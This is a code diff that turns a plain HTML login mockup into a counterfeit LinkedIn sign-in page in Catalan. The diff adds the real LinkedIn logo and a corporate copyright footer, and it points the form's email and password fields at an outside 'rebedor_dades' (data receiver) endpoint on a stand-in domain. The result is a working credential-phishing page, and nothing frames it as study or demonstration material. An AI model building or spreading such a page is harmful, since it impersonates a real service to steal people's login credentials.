@@ -7,8 +7,8 @@
     <title>LinkedIn</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            background-color: #f4f4f4;
+            font-family: sans-serif;
+            background-color: #f2f2f2;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -25,15 +25,25 @@
             text-align: center;
         }
 
-        h1 {
-            color: #0077b5;
+        .logo {
+            width: 150px;
+            margin-bottom: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 5px;
         }
 
         input[type="email"],
         input[type="password"] {
             width: 100%;
-            padding: 10px;
-            margin: 8px 0;
+            padding: 8px;
             border: 1px solid #ccc;
             border-radius: 4px;
             box-sizing: border-box;
@@ -42,7 +52,7 @@
         button {
             background-color: #0077b5;
             color: white;
-            padding: 12px 20px;
+            padding: 10px 15px;
             border: none;
             border-radius: 4px;
             cursor: pointer;
@@ -53,28 +63,31 @@
             background-color: #005582;
         }
 
-        a {
-            color: #0077b5;
-            text-decoration: none;
-        }
-
-        a:hover {
-            text-decoration: underline;
+        .footer {
+            margin-top: 20px;
+            font-size: 0.8em;
+            color: #888;
         }
     </style>
 </head>
 <body>
-
     <div class="container">
-        <h1>LinkedIn</h1>
-        <form action="#" method="post">
-            <input type="email" id="email" name="email" placeholder="Correu electrònic o número de telèfon" required>
-            <input type="password" id="password" name="password" placeholder="Contrasenya" required>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/ca/LinkedIn_logo_initials.png/768px-LinkedIn_logo_initials.png" alt="LinkedIn Logo" class="logo">
+        <form action="https://www.example.com/rebedor_dades" method="post">
+            <div class="form-group">
+                <label for="email">Correu electrònic o número de telèfon</label>
+                <input type="email" id="email" name="email" required>
+            </div>
+            <div class="form-group">
+                <label for="password">Contrasenya</label>
+                <input type="password" id="password" name="password" required>
+            </div>
             <button type="submit">Inicia sessió</button>
         </form>
-        <a href="#">Has oblidat la contrasenya?</a>
+        <div class="footer">
+            LinkedIn Corporation © 2024
+        </div>
     </div>
-
 </body>
 </html>
 ```
